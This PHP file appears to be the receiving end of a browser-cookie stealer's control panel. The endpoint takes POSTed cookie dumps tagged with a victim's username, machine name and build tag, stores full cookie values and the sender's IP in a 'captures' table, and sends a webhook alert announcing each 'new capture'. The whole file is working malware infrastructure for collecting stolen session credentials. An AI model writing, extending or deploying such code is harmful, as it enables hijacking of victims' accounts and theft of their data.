<?php
declare(strict_types=1);
ini_set('display_errors', '0');

/**
 * POST /api/collect.php
 *   {"tag":"r...","app":"...","user":"...","machine":"...","at":"...","cookies":[
 *      {"browser":"Chrome","host":".example.com","name":"sid","value":"...","path":"/","expires":0}]}
 * -> {"ok":true}
 */

require __DIR__ . '/../lib/db.php';

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    json_out(['ok' => false, 'error' => 'POST required'], 405);
}

$body = read_json_body();
if (!$body) {
    json_out(['ok' => false, 'error' => 'empty body'], 400);
}

$cookies = $body['cookies'] ?? null;
if (!is_array($cookies)) {
    json_out(['ok' => false, 'error' => 'cookies must be an array'], 400);
}

$tag = substr(trim((string)($body['tag'] ?? '')), 0, 64);
$app = substr(trim((string)($body['app'] ?? '')), 0, 96);
$suser = substr(trim((string)($body['user'] ?? '')), 0, 96);
$machine = substr(trim((string)($body['machine'] ?? '')), 0, 96);
$at = substr(trim((string)($body['at'] ?? '')), 0, 32);
$ip = client_ip();
$agent = substr((string)($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 240);

// keep the stored copy bounded and normalised
$clean = [];
$browsers = [];
foreach ($cookies as $cookie) {
    if (!is_array($cookie)) {
        continue;
    }
    $entry = [
        'browser' => substr((string)($cookie['browser'] ?? ''), 0, 32),
        'host' => substr((string)($cookie['host'] ?? ''), 0, 192),
        'name' => substr((string)($cookie['name'] ?? ''), 0, 192),
        'value' => substr((string)($cookie['value'] ?? ''), 0, 4096),
        'path' => substr((string)($cookie['path'] ?? '/'), 0, 128),
        'expires' => (int)($cookie['expires'] ?? 0),
    ];
    if ($entry['name'] === '' || $entry['value'] === '') {
        continue;
    }
    $clean[] = $entry;
    $browsers[$entry['browser']] = ($browsers[$entry['browser']] ?? 0) + 1;
    if (count($clean) >= 20000) {
        break;
    }
}

$payload = json_encode([
    'tag' => $tag,
    'app' => $app,
    'user' => $suser,
    'machine' => $machine,
    'at' => $at,
    'cookies' => $clean,
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$stmt = db()->prepare(
    'INSERT INTO captures (tag, app, suser, machine, ip, agent, cookies, at, received, payload)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
);
$stmt->execute([$tag, $app, $suser, $machine, $ip, $agent, count($clean), $at, now_iso(), $payload]);

notify_webhook($tag, $app, $suser, $machine, $ip, count($clean), $browsers);

json_out(['ok' => true, 'count' => count($clean)]);

function notify_webhook(string $tag, string $app, string $user, string $machine,
                        string $ip, int $count, array $browsers): void
{
    $conf = panel_conf();
    $hook = trim((string)($conf['webhook'] ?? ''));
    if ($hook === '') {
        $hook = trim((string)(setting('webhook', '') ?? ''));
    }
    if ($hook === '' || strpos($hook, 'https://') !== 0) {
        return;
    }

    $lines = [];
    $lines[] = '**new capture** - ' . $count . ' cookies';
    $lines[] = '`' . $user . '@' . $machine . '` from ' . $ip;
    if ($tag !== '') {
        $lines[] = 'build `' . $tag . '`' . ($app !== '' ? ' / ' . $app : '');
    }
    if ($browsers) {
        arsort($browsers);
        $parts = [];
        foreach ($browsers as $name => $n) {
            $parts[] = $name . ' ' . $n;
        }
        $lines[] = implode(' | ', array_slice($parts, 0, 6));
    }

    $body = json_encode([
        'username' => 'Rose',
        'allowed_mentions' => ['parse' => []],
        'content' => implode("\n", $lines),
    ], JSON_UNESCAPED_SLASHES);

    post_async($hook, (string)$body);
}

function post_async(string $url, string $body): void
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 4,
            CURLOPT_CONNECTTIMEOUT => 3,
        ]);
        curl_exec($ch);
        curl_close($ch);
        return;
    }

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $body,
            'timeout' => 4,
            'ignore_errors' => true,
        ],
    ]);
    @file_get_contents($url, false, $context);
}
